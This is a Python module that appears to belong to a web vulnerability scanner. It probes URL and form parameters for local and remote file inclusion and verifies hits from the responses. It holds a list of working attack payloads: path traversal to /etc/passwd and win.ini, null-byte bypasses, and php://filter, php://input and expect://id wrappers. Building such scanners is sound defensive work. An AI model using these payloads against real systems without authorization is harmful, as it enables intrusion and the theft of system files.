import asyncio
import base64
import logging
import re
from urllib.parse import parse_qsl, urlparse

from app.core.detectors.base_detector import BaseDetector, Finding
from app.core.verification.response_analyzer import ResponseAnalyzer
from app.core.verification.verification_framework import HttpVerifier, URLParameterBuilder, FormPayloadBuilder
from app.models.vulnerability import OwaspCategory, SeverityLevel

logger = logging.getLogger(__name__)


class FileInclusionDetector(BaseDetector):
    name = "file_inclusion"

    fi_param_tokens = {
        "page", "file", "path", "include", "template", "doc", "dir", "load", "url", "src", "dest", "view"
    }

    LFI_PAYLOADS = [
        ("../../../../etc/passwd", r"root:x:0:0:", "Linux /etc/passwd LFI"),
        ("....//....//....//....//etc/passwd", r"root:x:0:0:", "Linux nested traversal LFI"),
        ("/etc/passwd", r"root:x:0:0:", "Linux absolute LFI"),
        ("../../../../../../../../etc/passwd", r"root:x:0:0:", "Linux deep traversal LFI"),
        ("..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", r"root:x:0:0:", "Linux URL-encoded deep traversal"),
        ("../../../../etc/passwd%00", r"root:x:0:0:", "Null-byte LFI bypass"),
        ("../../../../etc/passwd\x00.jpg", r"root:x:0:0:", "Null-byte + extension LFI bypass"),
        ("../../../../windows/win.ini", r"\[fonts\]|\[extensions\]", "Windows win.ini LFI"),
        ("C:\\windows\\win.ini", r"\[fonts\]|\[extensions\]", "Windows absolute win.ini LFI"),
        ("..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini", r"\[fonts\]|\[extensions\]", "Windows traversal LFI"),
        ("php://filter/convert.base64-encode/resource=index.php", "DYNAMIC_B64_CHECK", "PHP Filter Base64 LFI"),
        ("php://filter/read=convert.base64-encode/resource=../../../../etc/passwd", "DYNAMIC_B64_CHECK", "PHP Filter Base64 Traversal LFI"),
        ("php://input", "DYNAMIC_STREAM_CHECK", "PHP input stream injection"),
        ("data://text/plain;base64,U2VudHJ5VGVzdA==", r"SentryTest", "PHP data wrapper"),
        ("expect://id", r"uid=\d+", "PHP expect wrapper"),
    ]

    RFI_PAYLOADS = [
        ("http://0.0.0.0:0/sentry_rfi_test", "Remote HTTP include attempt"),
        ("https://0.0.0.0:0/sentry_rfi_test", "Remote HTTPS include attempt"),
    ]

    @staticmethod
    def _is_valid_src_code_delivery(text_content: str) -> bool:
        indicators = [r"<?php", r"html", r"doctype", r"require_once", r"include(", r"$_GET", r"$_POST"]
        return any(re.search(ind, text_content, re.IGNORECASE) for ind in indicators)

    async def detect(self, urls: list[str], forms: list[object], **kwargs: object) -> list[Finding]:
        findings: list[Finding] = []
        session_cookies = kwargs.get("session_cookies") or {}

        from app.core.crawler.param_discovery import ParamDiscovery
        
        def fi_filter(param_name: str) -> bool:
            param_lower = param_name.lower()
            return param_lower in self.fi_param_tokens or any(tok in param_lower for tok in ["file", "page", "path", "inc"])
            
        candidates = ParamDiscovery.build_candidates(urls, forms, filter_fn=fi_filter)

        if not candidates:
            return []

        semaphore = asyncio.Semaphore(4)
        verifier = HttpVerifier(cookies=session_cookies)
        verifier.set_request_context(module="lfi")

        async def verify_candidate(cand) -> list[Finding]:
            if len(cand) == 5:
                cand_url, param, method, val, form_inputs = cand
            else:
                cand_url, param, method, val = cand
                form_inputs = None

            cand_findings = []

            def _build_request_args(payload: str) -> tuple[str, dict | None, dict | None]:
                if method.upper() == "POST" and form_inputs is not None:
                    data = FormPayloadBuilder.build(form_inputs, param, payload)
                    return cand_url, None, data
                return URLParameterBuilder.inject_parameter(cand_url, param, payload, method)

            async with semaphore:
                verifier.set_request_context(parameter=param)
                try:
                    # 1. Establish the working baseline response
                    baseline_url, baseline_params, baseline_data = _build_request_args(val)
                    baseline = await verifier.send_request(
                        baseline_url, method, baseline_params, baseline_data, test_phase="baseline"
                    )
                    baseline_len = len(baseline.body)

                    # Gate: phpinfo/debug page exclusion — these pages echo everything
                    if ResponseAnalyzer.is_phpinfo_or_debug_page(baseline.body or ""):
                        logger.debug(
                            "Skipping LFI testing on phpinfo/debug page %s:%s",
                            cand_url, param,
                        )
                        return cand_findings

                    # 2. Establish a "Missing Content" control baseline using a benign invalid local path
                    control_url, control_params, control_data = _build_request_args("sentry_non_existent_file_control_marker")
                    control_res = await verifier.send_request(
                        control_url, method, control_params, control_data, test_phase="lfi_control"
                    )
                    control_len = len(control_res.body)
                    
                    # Determine if the template's content block is structurally dynamic
                    is_structural_dynamic = abs(baseline_len - control_len) > 15

                    rfi_error_terms = re.compile(
                        r"(failed to open stream: HTTP request failed|"
                        r"php_network_getaddresses: getaddrinfo failed|"
                        r"allow_url_include is disabled|"
                        r"java.net.MalformedURLException|java.io.FileNotFoundException)",
                        re.IGNORECASE,
                    )
                    
                    wrapper_error_terms = re.compile(
                        r"(failed to open stream: No such file or directory|Failed opening required)", 
                        re.IGNORECASE
                    )
                    
                    # --- Execute LFI Testing Suite ---
                    for payload, verify_rule, desc in self.LFI_PAYLOADS:
                        if verify_rule and verify_rule not in ["DYNAMIC_B64_CHECK", "DYNAMIC_STREAM_CHECK"]:
                            if re.search(verify_rule, baseline.body, re.I):
                                continue

                        injected_url, injected_params, injected_data = _build_request_args(payload)
                        injected = await verifier.send_request(
                            injected_url, method, injected_params, injected_data,
                            test_phase="lfi_injection", payload=payload,
                        )

                        if injected.status_code != 200:
                            continue

                        if verify_rule and verify_rule not in ["DYNAMIC_B64_CHECK", "DYNAMIC_STREAM_CHECK"]:
                            if re.search(verify_rule, injected.body, re.I):
                                # REFLECTION GUARD: Ensure the matched content isn't
                                # solely inside the reflected payload text.
                                if payload in injected.body:
                                    stripped_body = injected.body.replace(payload, "")
                                    if not re.search(verify_rule, stripped_body, re.I):
                                        logger.debug(
                                            "LFI verify_rule match for '%s' was inside reflected payload — "
                                            "suppressing as reflection %s:%s",
                                            payload, cand_url, param,
                                        )
                                        continue

                                # LENGTH DELTA GUARD: For traversal payloads (../),
                                # require ≥50 chars of new content vs control baseline
                                if "../" in payload or "..\\" in payload:
                                    injected_len = len(injected.body)
                                    delta = abs(injected_len - control_len)
                                    if delta < 50:
                                        logger.debug(
                                            "LFI traversal payload '%s' response too similar to control "
                                            "(delta=%d < 50) %s:%s — suppressing",
                                            payload, delta, cand_url, param,
                                        )
                                        continue

                                cand_findings.append(
                                    Finding(
                                        category=OwaspCategory.a05,
                                        vuln_type="Local File Inclusion (LFI)",
                                        severity=SeverityLevel.critical,
                                        url=cand_url,
                                        parameter=param,
                                        method=method,
                                        payload=payload,
                                        evidence=f"LFI confirmed via payload '{payload}' ({desc}). Unique system token detected.",
                                        confidence_score=95.0,
                                        detection_method="file_retrieval",
                                        reproducible=True,
                                        verified=True,
                                        verification_request_snippet=injected.request_snippet,
                                        verification_response_snippet=injected.response_snippet,
                                    )
                                )

                        elif verify_rule == "DYNAMIC_B64_CHECK":
                            b64_candidates = re.findall(r"([a-zA-Z0-9+/={4,}\s]{30,})", injected.body)
                            is_true_positive = False
                            for b64_str in b64_candidates:
                                normalized_b64 = re.sub(r"\s+", "", b64_str)
                                normalized_b64 += "=" * ((4 - len(normalized_b64) % 4) % 4)
                                try:
                                    decoded_bytes = base64.b64decode(normalized_b64, validate=False)
                                    decoded_str = decoded_bytes.decode("utf-8", errors="ignore")
                                    if self._is_valid_src_code_delivery(decoded_str) or "root:x:0:0:" in decoded_str:
                                        is_true_positive = True
                                        break
                                except Exception:
                                    continue
                                    
                            if is_true_positive:
                                cand_findings.append(
                                    Finding(
                                        category=OwaspCategory.a05,
                                        vuln_type="Local File Inclusion (LFI)",
                                        severity=SeverityLevel.critical,
                                        url=cand_url,
                                        parameter=param,
                                        method=method,
                                        payload=payload,
                                        evidence=f"LFI confirmed via Base64 stream decoding logic ({desc}).",
                                        confidence_score=98.0,
                                        detection_method="stream_decoding_oracle",
                                        reproducible=True,
                                        verified=True,
                                        verification_request_snippet=injected.request_snippet,
                                        verification_response_snippet=injected.response_snippet,
                                    )
                                )

                        elif verify_rule == "DYNAMIC_STREAM_CHECK":
                            # FIX: Compare wrapper errors explicitly against control layout behaviors 
                            # to ensure this error isn't triggered by standard "file not found" failures.
                            if wrapper_error_terms.search(injected.body):
                                if not wrapper_error_terms.search(baseline.body) and not wrapper_error_terms.search(control_res.body):
                                    cand_findings.append(
                                        Finding(
                                            category=OwaspCategory.a05,
                                            vuln_type="Local File Inclusion (LFI)",
                                            severity=SeverityLevel.high,
                                            url=cand_url,
                                            parameter=param,
                                            method=method,
                                            payload=payload,
                                            evidence=f"Wrapper-specific anomaly caught via strict error difference check ({desc}).",
                                            confidence_score=75.0,
                                            detection_method="wrapper_error_analysis",
                                            reproducible=True,
                                            verified=True,
                                            verification_request_snippet=injected.request_snippet,
                                            verification_response_snippet=injected.response_snippet,
                                        )
                                    )

                    # --- Execute Advanced RFI Suite ---
                    for payload, desc in self.RFI_PAYLOADS:
                        injected_url, injected_params, injected_data = _build_request_args(payload)
                        injected = await verifier.send_request(
                            injected_url, method, injected_params, injected_data,
                            test_phase="rfi_injection", payload=payload,
                        )
                        
                        if injected.status_code != 200:
                            continue

                        # Evaluation Track A: Verbose Error Signatures Exist (Highly Reliable)
                        if rfi_error_terms.search(injected.body) and not rfi_error_terms.search(baseline.body):
                            cand_findings.append(
                                Finding(
                                    category=OwaspCategory.a05,
                                    vuln_type="Remote File Inclusion (RFI)",
                                    severity=SeverityLevel.high,
                                    url=cand_url,
                                    parameter=param,
                                    method=method,
                                    payload=payload,
                                    evidence=f"RFI confirmed via explicit system error mapping ({desc}).",
                                    confidence_score=95.0,
                                    detection_method="remote_include_error_oracle",
                                    reproducible=True,
                                    verified=True,
                                    verification_request_snippet=injected.request_snippet,
                                    verification_response_snippet=injected.response_snippet,
                                )
                            )
                            break

                except Exception as e:
                    logger.error("File inclusion verification failed for %s param %s: %s", cand_url, param, e)
            return cand_findings

        tasks = [verify_candidate(c) for c in candidates]
        results = await asyncio.gather(*tasks)
        for res in results:
            findings.extend(res)

        await verifier.close()
        return findings